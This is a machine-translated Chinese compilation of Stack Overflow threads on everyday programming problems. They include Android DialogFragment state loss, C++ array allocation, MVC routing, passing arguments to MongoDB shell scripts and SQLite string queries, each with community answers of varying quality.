   ProgressFragment progFragment = new ProgressFragment();  
   progFragment.show(getActivity().getSupportFragmentManager(), PROG_DIALOG_TAG);

   // other code
} 
```

我查看了 FragmentActivity 的[源代码](https://github.com/android/platform_frameworks_support/blob/master/v4/java/android/support/v4/app/FragmentActivity.java)，看起来它正在调用内部片段管理器以便在不丢失状态的情况下恢复片段。

* * *

我找到了一个未在此处列出的解决方案。我创建一个 Handler，并在 Handler 中启动对话片段。所以，稍微编辑一下你的代码：

```
onActivityResult(int requestCode, int resultCode, Intent data) {

   //other code

   final FragmentManager manager = getActivity().getSupportFragmentManager();
   Handler handler = new Handler();
   handler.post(new Runnable() {
       public void run() {
           ProgressFragment progFragment = new ProgressFragment();  
           progFragment.show(manager, PROG_DIALOG_TAG);
       }
   }); 

  // other code
} 
```

这对我来说似乎更干净，更不老套。

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2013-04-25T03:46:35.710

有两种 DialogFragment show() 方法 -`show(FragmentManager manager, String tag)`和`show(FragmentTransaction transaction, String tag)`.

如果您想使用该方法的 FragmentManager 版本（如在原始问题中），一个简单的解决方案是覆盖此方法并使用 commitAllowingStateLoss：

```
public class MyDialogFragment extends DialogFragment {

  @Override 
  public void show(FragmentManager manager, String tag) {
      FragmentTransaction ft = manager.beginTransaction();
      ft.add(this, tag);
      ft.commitAllowingStateLoss();
  }

} 
```

覆盖`show(FragmentTransaction, String)`这种方式并不容易，因为它还应该修改原始 DialogFragment 代码中的一些内部变量，所以我不推荐它 - 如果您想使用该方法，请尝试接受的答案中的建议（或来自的评论）杰弗里·布拉特曼）。

使用 commitAllowingStateLoss 存在一些风险 - 文档声明“与 commit() 类似，但允许在保存活动状态后执行提交。这是危险的，因为如果活动需要稍后从其状态恢复，则提交可能会丢失, 所以这应该只用于 UI 状态可以在用户上意外更改的情况。”

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2013-05-24T01:56:49.060

在附加活动调用其方法 onSaveInstanceState() 后，您无法显示对话框。显然，onSaveInstanceState() 是在 onActivityResult() 之前调用的。所以你应该在这个回调方法 OnResumeFragment() 中显示你的对话框，你不需要重写 DialogFragment 的 show() 方法。希望这会帮助你。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2012-12-18T03:21:19.833

我提出了第三种解决方案，部分基于 hmt 的解决方案。基本上，创建一个 DialogFragments 的 ArrayList，在 onResume() 上显示；

```
ArrayList<DialogFragment> dialogList=new ArrayList<DialogFragment>();

//Some function, like onActivityResults
{
    DialogFragment dialog=new DialogFragment();
    dialogList.add(dialog);
}

protected void onResume()
{
    super.onResume();
    while (!dialogList.isEmpty())
        dialogList.remove(0).show(getSupportFragmentManager(),"someDialog");
} 
```

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2013-07-29T14:52:42.410

onActivityResult() 在 onResume() 之前执行。您需要在 onResume() 或更高版本中完成您的 UI。

使用布尔值或任何你需要的东西来传达结果已经在这两种方法之间返回。

... 就是这样。简单的。

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2013-06-13T06:29:34.953

我知道这是很久以前回答的......但是有一种比我在这里看到的其他一些答案更简单的方法......在我的具体情况下，我需要显示来自片段 onActivityResult() 的 DialogFragment方法。

这是我处理它的代码，它工作得很好：

```
DialogFragment myFrag; //Don't forget to instantiate this
FragmentTransaction trans = getActivity().getSupportFragmentManager().beginTransaction();
trans.add(myFrag, "MyDialogFragmentTag");
trans.commitAllowingStateLoss(); 
```

正如在其他一些帖子中提到的那样，如果您不小心，提交状态丢失可能会导致问题......在我的情况下，我只是向用户显示一条错误消息，并带有一个关闭对话框的按钮，所以如果失去的状态没什么大不了的。

希望这可以帮助...

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2015-10-01T13:41:07.110

这是一个老问题，但我认为我已经用最简单的方法解决了：

```
getActivity().runOnUiThread(new Runnable() {
    @Override
        public void run() {
            MsgUtils.toast(getString(R.string.msg_img_saved),
                    getActivity().getApplicationContext());
        }
    }); 
```

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2017-08-31T15:39:58.877

这是因为当调用#onActivityResult() 时，父活动已经调用了#onSaveInstanceState()

我会使用 Runnable 来“保存”#onActivityResult() 上的操作（显示对话框），以便稍后在活动准备好时使用它。

通过这种方法，我们确保我们想要的操作将始终有效

```
@Override
public void onActivityResult(int requestCode, int resultCode, Intent data) {
    if (requestCode == YOUR_REQUEST_CODE) {
        mRunnable = new Runnable() {
            @Override
            public void run() {
                showDialog();
            }
        };
    } else {
        super.onActivityResult(requestCode, resultCode, data);
    }
}

@Override
public void onStart() {
    super.onStart();
    if (mRunnable != null) {
        mRunnable.run();
        mRunnable = null;
    }
} 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2013-11-03T13:59:19.390

我找到的最干净的解决方案是：

```
@Override
public void onActivityResult(final int requestCode, final int resultCode, final Intent data) {
    new Handler().post(new Runnable() {
        @Override
        public void run() {
            onActivityResultDelayed(requestCode, resultCode, data);
        }
    });
}

public void onActivityResultDelayed(int requestCode, int resultCode, Intent data) {
    // Move your onActivityResult() code here.
} 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2015-02-25T05:35:15.783

我在活动时遇到此错误`.show(getSupportFragmentManager(), "MyDialog");`。

先试试`.show(getSupportFragmentManager().beginTransaction(), "MyDialog");`。

如果仍然无法正常工作，这篇文章（[来自 onActivityResult 的 Show DialogFragment](https://stackoverflow.com/questions/10114324/show-dialogfragment-from-onactivityresult/10114942#10114942)）可以帮助我解决问题。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2017-06-22T04:52:02.110

其他方式：

```
@Override
public void onActivityResult(int requestCode, int resultCode, Intent data) {
    switch (requestCode) {
        case Activity.RESULT_OK:
            new Handler(new Handler.Callback() {
                @Override
                public boolean handleMessage(Message m) {
                    showErrorDialog(msg);
                    return false;
                }
            }).sendEmptyMessage(0);
            break;
        default:
            super.onActivityResult(requestCode, resultCode, data);
    }
}

private void showErrorDialog(String msg) {
    // build and show dialog here
} 
```

* * *

## 回答 #16

> 赞同：-1
> 
> 时间：2017-07-20T14:47:01.833

`super.onActivityResult(requestCode, resultCode, data);`在处理片段之前调用

* * *

## 回答 #17

> 赞同：-3
> 
> 时间：2015-04-08T06:01:08.290

众所周知，这个问题是因为 onActivityResult() 在 onstart() 之前调用，所以只需在 onActivityResult() 开始时调用 onstart()，就像我在这段代码中所做的那样

```
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
      onStart();
      //write you code here
} 
```

# java - 返回所有成对产品的二维数组

> ID：10114331
> 
> 赞同：-1
> 
> 时间：2012-04-11T21:33:53.927
> 
> 标签：java, multidimensional-array

编写一个`static int [][] pr (int [] v)`返回二维数组的方法，该数组由 v 元素的所有成对乘积组成。例如，`a = {{2, 3, 1}`该方法返回二维数组`b = {{4, 6, 2}, {6, 9, 3}, {2, 3, 1}}`。请注意：这是一道 2010 年的考试题，取自软件和编程 1 模块。

```
public class ETenBTwoD
{
    public static int [] [] pr (int [] v)
    {
        int [] a = {2, 3, 1};
        int [][] b = {{0, 0, 0},{0, 0, 0}, {0, 0, 0}};
        for (int i = 0; i<a.length; i++)
        {
            a[i] = a[i] * a[i];
        }
        return a;
    }
} 
```

我不知道该怎么做。帮助将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:49:46.937

关键是使用嵌套循环。如您所见，v[i] 采用第一个数字（由第一个循环选择）并将其乘以 v（参数数组）中的所有数字，因为 j 必须增加 v 的全长。然后第一个循环挑选出第二个数字，第二个循环再次执行。在 b[i][j] 中，i 表示我们正在计算成对乘积的当前数字。

```
public static void main(String[] args){
    int[] v = {5,4,3,2,1};
    pr(v);}
    public static int [] [] pr (int [] v)
    {
        int [][] b =new int[v.length][v.length] ;
        for (int i = 0; i<v.length; i++)
        {
            for(int j=0; j<v.length;j++){
                b[i][j] = v[i] * v[j];
            }
        }

        System.out.println(b[0][0]+" "+b[0][1]+" "+b[0][2]);
        System.out.println(b[1][0]+" "+b[1][1]+" "+b[1][2]);
        System.out.println(b[2][0]+" "+b[2][1]+" "+b[2][2]);
        return b;
    } 
```

# c++ - 如何在单独的行上用“new”初始化数组？

> ID：10114336
> 
> 赞同：0
> 
> 时间：2012-04-11T21:34:25.523
> 
> 标签：c++, arrays

我正在读一本关于 C++ 的书。我想我应该练习一些我所知道的。所以我创建了一个类，它包含一个`classname * name[]`我稍后会分配的成员，`new`因为我不知道它需要多少空间。因此，当我尝试键入时`name = new classname[capacity /* a variable passed in constructor */]`，它不起作用。现在想来，这很有道理。我参考了我的书，我意识到这`name`与`&name[0]`. 这解释了为什么我的 IDE 说“表达式必须是可修改的左值”。所以现在我的问题是，如何在一行上声明一个数组，然后`new`在另一行上分配它？我也想知道为什么`type * name[]`作为班级成员有效，但不在班级之外？

```
class MenuItem
{
public:
    MenuItem(string description):itsDescription(description) {};
    void setDescription(string newDescription);
    string getDescription() const;
private:
    string itsDescription;
};

void MenuItem::setDescription(string newDescription)
{
    itsDescription = newDescription;
}

string MenuItem::getDescription() const
{
    return itsDescription;
}

class Menu
{
public:
    Menu(int capacity);
private:
    MenuItem * items[];
};

Menu::Menu(int capacity)
{
    items = new MenuItem("")[capacity];
} 
```

任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T21:47:12.850

与 Java 不同，`MenuItem* items[]`它不是正确的类型，并且只允许在三种情况下使用，并且您不会在任何一种情况下使用它。从您的其余问题来看，我假设您想要一个动态大小的`MenuItem`项目数组。在这种情况下，您的成员应该只是`MenuItem* items;`. 然后你可以分配那个对象的数组没问题。

```
int capacity = 4;
items = new MenuItem[capacity]; //these are default initialized 
```

正如评论（和反对者？）所说，“最佳”解决方案只是使用一个`std::vector<MenuItem> items`成员，并让它自动为您处理分配和解除分配。

**有教育意义但不是很重要：**
在 C++ 中，唯一可以使用空括号`[]`的时间是：

```
// as array parameters (don't be fooled, this is actually a pointer)
void myfunction(int array[]) 
```

和

```
// as local array defintion BUT ONLY WHEN IMMEDIATELY ASSIGNED VALUES
int array[] = {3, 6, 1}; 
```

和

```
// as the last member of an extensible object, for a C hack.

struct wierd {
    int array[];  // effectively a zero length array
};
wierd* dynamic = malloc(sizeof(wierd) + capacity*sizeof(int));

// don't do this in C++
// Actually, I think this is technically illegal as well, 
// but several compilers allow it anyway. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T21:50:09.173

在 C 中，数组由其第一个元素的地址引用。你会注意到一个指针引用了一个地址......

```
MenuItem * items;
items = new MenuItem[size]; 
```

在这种情况下，items 是指向一个或多个 MenuItem 实例的指针。在这种情况下，C++ 也是如此。这是一个简化版本，如果您想将指向数组的指针作为参数传递，还需要考虑其他复杂性，但我相信您会在到达那里时弄清楚这些。

以防万一您想知道，使用您拥有的代码：

```
MenuItem * itemsarr[];   // invalid still because no array size 
```

在这种情况下，您将 itemarr 声明为指向 MenuItem 实例的指针数组。正如下面的附加注释所示，除非您指定合法的数组大小，否则这本身仍然不是一般有效的语法，例如。

```
MenuItem * itemsarr[20];  // would be valid 
```

**编辑：**使学究友好。

# wpf - 如何防止键盘导航？

> ID：10114339
> 
> 赞同：2
> 
> 时间：2012-04-11T21:34:49.647
> 
> 标签：wpf

考虑一下：我在 StackPanel 中有一堆按钮，我如何禁用这些按钮之间的导航？

KeyboardNavigation.TabNavigation="None" 正在完成部分工作 - 它使用 Tab 键禁用导航，但我仍然可以使用左/右箭头导航。

我如何完全禁用它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T21:43:38.523

你试过改变`KeyboardNavigation.DirectionalNavigation`吗？

您可以在 Min Zhu 中找到关于它的帖子：[键盘导航提示](http://social.msdn.microsoft.com/Forums/en/wpf/thread/b25bb4b8-93cf-4c56-88d1-0690965d728f)

# .net - 在 Win7 中以编程方式确定磁盘 I/O 的优先级

> ID：10114340
> 
> 赞同：1
> 
> 时间：2012-04-11T21:34:51.070
> 
> 标签：.net, process, io

从“Process Lasso”的[网站](http://bitsum.com/prolasso.php)上，他们声称：

> 自动暂时降低独占进程的 CPU 优先级和/或 I/O 优先级

有谁知道如何为特定进程/线程指定 I/O 优先级？为了澄清这个问题，我在我的机器上使用 RealFlow 运行流体模拟，它与 CPU 配合得很好，但经常抛出大约 20GB 大小的文件。这会导致巨大的磁盘队列和其他轻量级应用程序挂起。

我想编写一个简单的包装器来启动 RealFlow，降低 I/O 优先级并退出 - 就像......

```
Sub Main()
    ...
    Dim RealFlowProcess = Process.Start("RealFlow.exe", "Args")
    RealFlowProcess.??? = ???
    ...
End Sub 
```

我更喜欢纯 .Net 解决方案，但坦率地说，在开发人员的盒子上运行而没有太多开销的任何东西都是可以接受的（Powershell/C++/等）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:40:01.413

这是关于该主题的讨论，其中包含答案和大量背景信息：[https ://superuser.com/questions/136021/how-to-change-io-priority-of-a-process-or-thread-在win7](https://superuser.com/questions/136021/how-to-change-i-o-priority-of-a-process-or-thread-in-win7)

# asp.net - 为什么 IIS 生成 asp.net 页面这么慢？

> ID：10114343
> 
> 赞同：1
> 
> 时间：2012-04-11T21:35:18.037
> 
> 标签：asp.net, iis, optimization

当我使用 Visual Studio Web Dev Server 运行 asp.net (forms) 站点时，该站点运行得非常快（一切都在分析器下进行了优化），firebug 显示该页面需要大约 100 毫秒才能生成。但是当它部署在 IIS 下的 vps 上时，同一页面需要大约 400 毫秒。

为什么 IIS 生成的页面比平均 VS 开发服务器长？

我的意思是页面生成，没有加载，所以它不依赖于慢速网络或其他任何东西。我可以假设 vps 很慢，但它有 4BG RAM、2 个处理器并且只运行一个 asp.net 站点，所以没有什么可以浪费资源。

如果 VS Dev Server 可以在 ~100ms 内生成页面，那么我猜 IIS 应该也能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T21:51:38.200

那不是IIS。这是您共享资源有限的低质量 VPS。尝试一些更好的服务器或在本地 IIS 上进行测试。

# c++ - 插入到链表后，值头值是最后输入的值。为什么？

> ID：10114350
> 
> 赞同：1
> 
> 时间：2012-04-11T21:35:55.363
> 
> 标签：c++, generics, linked-list

我有一个像这样的通用链表结构

```
template <typename E, typename F>
struct node
{
public:
    E data;
    node<E, F>* next;
    node<F, F>* down;
}; 
```

和这样的一堂课

```
class LetterList
{
private:
    node <char, Dictionary> *head;
public:
    LetterList(){head = NULL;};
    void createLetterList();
    void print();
}; 
```

"node *head;" 中的字典 是另一个类；我想做的是使用 LetterList 类将所有字母插入到链表中。这是我的代码..

```
node <char, Dictionary> *p = new node <char, Dictionary>;
    p->data = 'A';
    char ch;
    if (head == NULL)
        {
            p->next = NULL;
            head = p;
        }

    node <char, Dictionary> *q = head;

    while (true)
    {
        for (int i=66; i<91;i++)
        {
            ch = char (i);
            p->data = ch;
            q ->next = p;
            if (i == 90)
            {
                q->next = NULL;
            }
            else
                q = q->next;
        }
        break;
    }
} 
```

执行此代码后，链表的头部是'Z'，但它不应该是'A'吗？请告诉我我在这方面做错了什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T09:43:13.163

正如 jcopenha 所提到的，您不是动态创建新节点。您只需将 'q' 指向头部并使用 A、B、C 等更新其数据，直到 Z。以下对代码的更新应该可以工作：

```
while (true)
{
    node <char, Dictionary> *temp;
    temp = NULL;
    p -> next = temp;
    for (int i=66; i<91;i++)
    {
        ch = char (i);
        node <char, Dictionary> *z = new node <char, Dictionary>;
        z->data = ch;
        temp = z;
        temp->next = NULL;
        temp = temp->next;       
    }
    break;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T21:45:23.320

您只分配一个节点。如果您想在列表中有节点“A”到“Z”，那么您需要随时分配一个新节点以将其添加到列表中。

# asp.net-mvc-3 - 如何在 MVC 路由中结合 CatchAll 和 EndsWith？

> ID：10114352
> 
> 赞同：6
> 
> 时间：2012-04-11T21:35:58.083
> 
> 标签：asp.net-mvc-3

以下路由将匹配 BasePath 下的任何文件夹结构：

```
http://BasePath/{*SomeFolders}/ 
```

如何创建另一条与相同 BasePath 结构下的任何 zip 文件匹配的路由？

我试过这个...

```
http://BasePath/{*SomeFolders}/{ZipFile} 
```

...但它与

*包含多个部分（例如文字部分或参数）的路径段不能包含包罗万象的参数。参数名称：routeUrl*

**我应该如何处理这个？**

****更新****

原来的要求实际上是有缺陷的。{ZipFile} 将匹配最后一个部分，无论它包含什么。（文件或文件夹）

实际上，我相信我要匹配的路由模式应该是：

```
http://BasePath/{*SomeFolders}/{ZipFile}.zip 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T23:07:19.583

似乎约束是这里的答案。

```
 routes.MapRoute( _
        "ViewFile", "BasePath/{*RestOfPath}", _
        New With {.controller = "File", .action = "DownloadFile"}, _
        New With {.RestOfPath = ".*\.zip"}
    )
    routes.MapRoute( _
        "ViewFolder", "BasePath/{*RestOfPath}", _
        New With {.controller = "Folder", .action = "ViewFolder"} _
    ) 
```

或者对于那些喜欢 C# 的人...

```
 routes.MapRoute( 
        "ViewFile", "BasePath/{*RestOfPath}", 
        new {controller = "File", action = "DownloadFile"}, 
        new {RestOfPath = @".*\.zip"}
    );
    routes.MapRoute( 
        "ViewFolder", "BasePath/{*RestOfPath}", 
        new {controller = "Folder", action = "ViewFolder"} 
    ); 
```

（嗯，我认为这是正确的）

相同的路由被注册了两次，第一个变体被赋予额外的约束，即 RestOfPath 参数应该以“.zip”结尾

我了解到自定义约束也可以使用 IRouteConstraint 的衍生物。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-12T06:37:28.743

## 捕获 URL 中的所有内容 - 正是您需要的

我编写了这样`Route`的课程，让您可以完全按照您的描述进行操作。它允许您将包罗万象的段作为路线定义中的第一个段（或实际上其他任何地方）。它将允许您将路线定义为：

```
"BasePath/{*SomeFolders}/{ZipFile}" 
```

整个事情在[我的博客文章](http://erraticdev.blogspot.com/2011/01/custom-aspnet-mvc-route-class-with.html)中有详细的描述，你可以在其中找到这个`Route`类的代码。

## 附加信息

基于添加的信息，我仍然宁愿使用第一个不排除路由段参数中的文件扩展名的路由定义，而是为最后一个段添加约束

```
"[a-zA-Z0-9_]+\.zip" 
```

因此，路由仍应按照我的回答中的上述定义，但`ZipFile`应按照先前编写的方式定义。这将使我的特殊路线像现在一样开箱即用。

为了使其也适用于其他路由分隔符（例如您的示例中的*点*），代码应该进行相当大的更改，但是如果您非常了解路由的工作原理，您可以将其更改为以这种方式工作。

但我宁愿建议你保持简单并添加一个约束。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T22:56:35.473

正如错误所说，你的包罗万象必须是你路线中的最后一个参数。

要取出 ZipFile 部分，您必须从 SomeFolders 包中解析它：

```
public ActionResult MyAction(string SomeFolders)
{
    // parse the ZipFile out from the SomeFolders argument
} 
```

所以如果你有 /folder1/folder2/folder3/file.zip，你可以这样做：

```
var zipFile = SomeFolders.SubString(SomeFolders.LastIndexOf("/") + 1); 
```

# javascript - 如何将参数传递给 Mongo 脚本

> ID：10114355
> 
> 赞同：70
> 
> 时间：2012-04-11T21:36:18.247
> 
> 标签：javascript, mongodb, scripting

我一直在使用这样的 mongo 和脚本文件：

```
$ mongo getSimilar.js 
```

我想将参数传递给文件：

```
$ mongo getSimilar.js apples 
```

然后在脚本文件中选择传入的参数。

```
var arg  = $1;
print(arg); 
```

* * *

## 回答 #1

> 赞同：116
> 
> 时间：2012-04-11T22:19:52.223

使用`--eval`并使用shell脚本来修改传入的命令。

`mongo --eval "print('apples');"`

或者制作全局变量（感谢 Tad Marshall）：

```
$ cat addthem.js
printjson( param1 + param2 );
$ ./mongo --nodb --quiet --eval "var param1=7, param2=8" addthem.js
15 
```

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2012-04-11T22:05:57.107

你不能这样做，但你可以将它们放在另一个脚本中并首先加载：

```
// vars.js
msg = "apples"; 
```

getSimilar.js 是：

```
print(msg); 
```

然后：

```
$ mongo vars.js getSimilar.js
MongoDB shell version: blah
connecting to: test
loading file: vars.js
loading file: getSimilar.js
apples 
```

不过，不太方便。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-03-09T11:19:29.987

设置一个外壳变量：

```
password='bladiebla' 
```

创建js脚本：

```
cat <<EOT > mongo-create-user.js
print('drop user admin');
db.dropUser('admin');
db.createUser({
user: 'admin',
pwd: '${password}',
roles: [ 'readWrite']
});
EOT 
```

将脚本传递给 mongo：

```
mongo mongo-create-user.js 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-02-24T20:01:57.590

我使用 shell 脚本将 mongo 命令通过管道传输到 mongo。在 mongo 命令中，我使用了一个传递给 shell 脚本的 arg（即我使用了`$1`）：

```
#!/bin/sh

objId=$1
EVAL="db.account.find({\"_id\" : \"$objId\"})"
echo $EVAL | mongo localhost:27718/balance_mgmt --quiet 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-11-08T11:40:18.640

我通过使用 javascript bundler parcel 解决了这个问题：[https ://parceljs.org/](https://parceljs.org/)

有了这个，可以在脚本中使用节点环境变量，例如：

```
var collection = process.env.COLLECTION; 
```

使用包裹构建时，env var 被内联：

```
parcel build ./src/index.js --no-source-maps 
```

唯一的缺点是，每次要更改环境变量时都必须重新构建脚本。但由于包裹真的很快，这不是一个真正的问题恕我直言。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-06-13T22:26:34.170

我写了一个小工具来为自己解决这个问题。使用该`mongoexec`实用程序，您可以`./getSimilar.js apples`通过将以下内容添加到脚本的开头来运行该命令：

```
#!/usr/bin/mongoexec --quiet 
```

在脚本中，您可以将参数作为`args[0]`.

[https://github.com/pveierland/mongoexec](https://github.com/pveierland/mongoexec)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2022-02-26T05:28:47.973

2022年更新：

使用时，`mongosh`您可以从`process.argv`

```
mongosh script.js param1 param2 
// process.argv will be [.... , 'param1', param2'] 
```

棘手的一点是`mongosh`它将尝试将参数（例如`param1`和`param2`）作为附加脚本执行，但这可以通过使用结束脚本来防止`quit()`。（TBH，我不确定这是设计/预期/记录的）

# android - 使用字符串作为参数进行搜索时是否需要不同的查询

> ID：10114356
> 
> 赞同：0
> 
> 时间：2012-04-11T21:36:22.460
> 
> 标签：android, database, sqlite

我正在查询我的数据库。当我使用 int 作为选择部分时，我得到了我想要的返回信息。当我使用字符串进行选择时，我什么也没有返回。使用字符串时是否有不同的查询方式或者我做错了什么。这个函数在我传入一个 int 时起作用，但是当我传入一个字符串时它不起作用。我使用了断点，进入函数的参数是正确的，但它没有从数据库中检索数据。

这是代码

```
 public String childFound(String item_name)throws Exception
{

    Cursor c = db.query(DB_TABLE, new String[] { KEY_INSPECTION_ID, KEY_ITEM_NAME},
            "item_name="+ item_name, null, null, null, null);

       int id=c.getColumnIndex(KEY_ITEM_NAME);
        c.moveToFirst();
        String result=c.getString(id);
       c.close();
       return result;

} 
```

如果我将 String item_name 更改为 int InspectionItem 它可以工作。我还包括我为数据库声明变量的位置。

```
 public class InspectionRecordsTableDBAdapter {
private static final String KEY_ROWID = "_id";
private static final String KEY_INSPECTION_ID = "inspection_id";
private static final String KEY_PARENT_NAME = "parent_name";
private static final String KEY_ITEM_NAME = "item_name";
private static final String KEY_COMMENT = "comment";
private static final String KEY_STATUS = "status";
private static final String DB_TABLE = "inspection_records";
private Context context;
private SignalSetDBHelper dbHelper;
private SQLiteDatabase db;
private SQLiteOpenHelper openHelper; 
```

如果您需要更多代码，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:46:06.540

```
"item_name="+ item_name 
```

应该

```
"item_name='"+ item_name + "'" 
```

认为你错过了引号

# asp.net-mvc-3 - 删除一对一关系的一侧并从另一侧取消其引用

> ID：10114360
> 
> 赞同：1
> 
> 时间：2012-04-11T21:36:32.337
> 
> 标签：asp.net-mvc-3, fluent-nhibernate, cascade, one-to-one

我有两个可以关联的实体，但它们都可以存在而没有彼此。本质上，它们都是 1 到 0..1。

实体 B 可以从它创建一个实体 A - 完成后，它会建立一个关系，以便实体 B 有 1 个实体 A。同样，由于它可以返回为可选，用户必须能够删除实体 A 而无需删除其父实体 B。

在数据库中，我的实体 A 没有实体 B 外键，因此删除实体 B 永远不会成为问题。

然而，实体 B 有一个可以为空的字段来保存实体 A 的外键。到目前为止，我只能让 Nhibernate 将坏键留在表中，或者在删除关联的实体 A 时完全删除关联的行。

长话短说，如果我在实体 A 上单击删除，它应该在实体 B 表中取消对它的引用，如果存在的话。如何在 Fluent Mapping 中解决这个问题？

# perl - 通过代理服务器使用 Google Translate API v2

> ID：10114362
> 
> 赞同：0
> 
> 时间：2012-04-11T21:36:49.403
> 
> 标签：perl, google-translate

我有一个调用 Google Translate API v2 的 perl 脚本。我有一把钥匙，这个脚本在家里可以正常工作。但它在工作中失败了，唯一的区别是我在 VPN 上并且必须在工作中使用代理服务器。我的 perl 脚本设置了代理服务器，并且已经使用许多 URL 进行了测试，并且连接到其中任何一个都没有问题。我还使用 BableFish Translate API 测试了相同的脚本，并且该脚本再次运行良好。但是，所有访问 Google Translate API v2 的尝试都失败了。

失败消息是：

> “失败：翻译后端失败；语言调用失败：500 连接失败：连接：连接超时；连接在 /usr/lib/perl5/site_perl/5.10/Lingua/Translate/Google.pm 第 246 行超时”

关于为什么脚本在工作时仅使用 Google Translate API v2 失败的任何想法？
关于如何调试的任何建议？

**这是我的密钥管理员**

服务器应用程序的密钥（带 IP 锁定）
API 密钥：..为安全起见已删除..
IP：允许任何 IP
激活时间：2012 年 1 月 31 日下午 2:39
激活者：您

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T07:15:25.280

也许代理会删除/更改请求中的一个或多个标头。

尝试使用 mozilla 连接到链接，并使用 Live Httpd 标头插件检查在家中设置和接收的标头以及 $work。

在家里和 $work 打印出脚本中的标题并搜索差异。

问候，

# mysql - 通过添加递增数字使 varchar 字段中的重复项不重复

> ID：10114364
> 
> 赞同：0
> 
> 时间：2012-04-11T21:36:54.473
> 
> 标签：mysql, sql

我正在升级数据库架构。一张桌子分成2张桌子。这两个表是链接的，链接它们的唯一方法是使用原始表中的 varchar 名称字段。

问题是客户*可能*有重复的名称，因为名称不是主键/唯一键。

我来到这里寻找使这些名称独一无二的想法，以便在将数据移动到两个新的链接表时可以用作键。

在我写这篇文章时，我想到了将当前的 PK 连接到名称（如在 CONCAT(name,id) as newName 中）并将其用作键。

还有一个唯一的代码字段，但这仅适用于其中一个新表。

示例架构：

```
tableA
a_id INT(11) PRI AUTO_INCREMENT
code VARCHAR(10) UNIQUE 
name VARCHAR(30) NOT NULL

newTableB
b_id INT(11) PRI AUTO_INCREMENT
name VARCHAR(30)

newTableC
c_id INT(11) PRI AUTO_INCREMENT
b_id INT(11) FK->newTableB
code VARCHAR(10) UNIQUE 
```

我想要的是：

1.  生成新的 b_id (auto_increment)
2.  从 tableA.name 导入的 newTableB.name
3.  从 tableA.code 导入的 newTableC.code
4.  从 tableA.a_id 导入的 newTableC.c_id

a_id 是另一个保持不变的第四个表中的 FK。进行上述更改后，c_id 现在将成为第四个表中的有效 FK。

**我的挑战：** 如何插入这些新表但仍保持原始名称<->代码<->a_id 关系并将tableA.a_id 值传输到newTableC.c_id。不在乎 b_id 是否获得新的 auto_incr。价值观。

不确定我遇到的问题有多清楚，但请随时提出任何问题。

谢谢丹

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:51:25.470

我通常分几个部分完成这样的任务。首先插入表 b，但将 a 中的 id 字段放在名称列而不是名称中。然后将数据从表a插入到tablec中。然后通过在 a.id 和 b.name 字段上加入表 a 来更新 tableb 名称字段。但是我不确定你是否可以在 mysql 的更新中使用连接。应该是一种编写语句的方式，尽管一旦你在那里有了数据。

或者，我暂时在表 b 中添加一个名为 tableid 的列。然后我将包括a id的数据放入tableb中，并使用它加入表a以获取表c的b.id和表A数据。完成后，我从表 b 中删除 tableA 列。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T21:51:06.373

这个怎么样

```
CREATE TABLE temp_newTableB AS (SELECT * FROM newTableB);
DELETE FROM newTableB WHERE b_id NOT IN (SELECT b_id FROM temp_newTableB GROUP BY name);
DROP TABLE temp_newTableB ; 
```

但是是否有任何规则可供您决定`b_id`要保留哪些规则，因为上述查询将从中删除`newTableC`一些命名的重复项？`b_id``newTableB`

# javascript-events - javascript下拉显示内容

> ID：10114367
> 
> 赞同：1
> 
> 时间：2012-04-11T21:37:25.590
> 
> 标签：javascript-events

```
 $(document).ready(function () {
     $('.group').hide();
     $('#selectMe').change(function () {
         $('.group').hide();
         $('#' +$(this).val()).show();
     })
 });

<html>
<label for="hi" title="hi">hi</label>
<select name="selectMe" id="selectMe">
<option>Select</option>
<option value="option1">option1</option>
<option value="option2">option2</option>
<option value="option3">option3</option>
<option value="option4">option4</option>
</select>
<div id="option1" class="group">
<label for="Your State" title="Your State">Your State</label>
<select name="Your State" id="Your State">
<option>Select</option>
<option value="albama">Albama</option>
<option value="alaska">Alaska</option> 
<option value="arizona">Arizona</option>
</select>
</div>
<div id="option2" class="group">xxxx</div>
<div id="option3" class="group">vvvv</div>
<div id="option4" class="group">dddd</div>
</html> 
```

你好，

当用户选择选项 1 时，我有代码显示您的状态下拉列表。

当他从你的州选择亚利桑那州时，我需要在两个下拉列表的底部显示“嗨朋友”.....请帮助我......提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:03:08.230

这就是你所追求的吗？

[http://jsfiddle.net/tR2xU/](http://jsfiddle.net/tR2xU/)

# nhibernate - NServiceBus 重试消息，即使没有异常

> ID：10114368
> 
